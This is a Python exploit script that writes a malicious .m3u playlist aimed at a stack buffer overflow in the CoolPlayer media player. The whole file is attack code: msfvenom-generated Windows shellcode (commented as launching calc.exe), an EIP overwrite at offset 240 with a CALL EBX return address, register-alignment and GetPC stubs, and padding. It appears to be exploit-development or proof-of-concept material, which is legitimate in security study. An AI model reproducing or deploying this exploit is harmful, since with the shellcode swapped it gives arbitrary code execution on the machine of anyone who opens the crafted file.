import sys,struct

filename = "coolplayer_sploit.m3u"

# msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0a\x0d" -v shellcode bufferregister=esi
# Payload size: 215 bytes
shellcode =  ""
shellcode += "\xba\x4f\xd7\xdf\xb7\x89\xf5\x29\xc9\xb1\x31\x31"
shellcode += "\x55\x13\x83\xc5\x04\x03\x55\x40\x35\x2a\x4b\xb6"
shellcode += "\x3b\xd5\xb4\x46\x5c\x5f\x51\x77\x5c\x3b\x11\x27"
shellcode += "\x6c\x4f\x77\xcb\x07\x1d\x6c\x58\x65\x8a\x83\xe9"
shellcode += "\xc0\xec\xaa\xea\x79\xcc\xad\x68\x80\x01\x0e\x51"
shellcode += "\x4b\x54\x4f\x96\xb6\x95\x1d\x4f\xbc\x08\xb2\xe4"
shellcode += "\x88\x90\x39\xb6\x1d\x91\xde\x0e\x1f\xb0\x70\x05"
shellcode += "\x46\x12\x72\xca\xf2\x1b\x6c\x0f\x3e\xd5\x07\xfb"
shellcode += "\xb4\xe4\xc1\x32\x34\x4a\x2c\xfb\xc7\x92\x68\x3b"
shellcode += "\x38\xe1\x80\x38\xc5\xf2\x56\x43\x11\x76\x4d\xe3"
shellcode += "\xd2\x20\xa9\x12\x36\xb6\x3a\x18\xf3\xbc\x65\x3c"
shellcode += "\x02\x10\x1e\x38\x8f\x97\xf1\xc9\xcb\xb3\xd5\x92"
shellcode += "\x88\xda\x4c\x7e\x7e\xe2\x8f\x21\xdf\x46\xdb\xcf"
shellcode += "\x34\xfb\x86\x85\xcb\x89\xbc\xeb\xcc\x91\xbe\x5b"
shellcode += "\xa5\xa0\x35\x34\xb2\x3c\x9c\x71\x4c\x77\xbd\xd3"
shellcode += "\xc5\xde\x57\x66\x88\xe0\x8d\xa4\xb5\x62\x24\x54"
shellcode += "\x42\x7a\x4d\x51\x0e\x3c\xbd\x2b\x1f\xa9\xc1\x98"
shellcode += "\x20\xf8\xa1\x7f\xb3\x60\x08\x1a\x33\x02\x54"

maxlen = 5000
crash_eip = 240

nop = "\x90" * 16

# Align EBX
# EBX = 0x0057a470, buffer = 0x0057a564, buffer - EBX = 0xf4 offset
align_ebx = (    "\x53"                          # PUSH EDX
                 "\x58"                          # POP EAX
                 "\x66\x05\x01\x01"              # ADD AX, 0x101
                 "\x50"                          # PUSH EAX
                 "\xc3"                          # RET
            )

getpc = (
            "\xEB\x05"                      # jmp short (5 bytes) to 'jmp back' at end
            "\x5E"                              #pop esi
            "\x41"                             #nop (inc ecx)
            "\xFF\xD6"                      #call esi
            "\x41"                              #nop (inc ecx)
            "\xE8\xF6\xFF\xFF\xFF"     #jmp back to pop esi
)

prefix = nop
prefix += align_ebx
prefix += "A" * (crash_eip - len(prefix))
eip = struct.pack("<L", 0x0048215b)                 # CALL EBX
suffix = nop
suffix += getpc
suffix += shellcode
suffix += "C" * (maxlen - len(prefix + eip + suffix))

payload = prefix + eip + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()
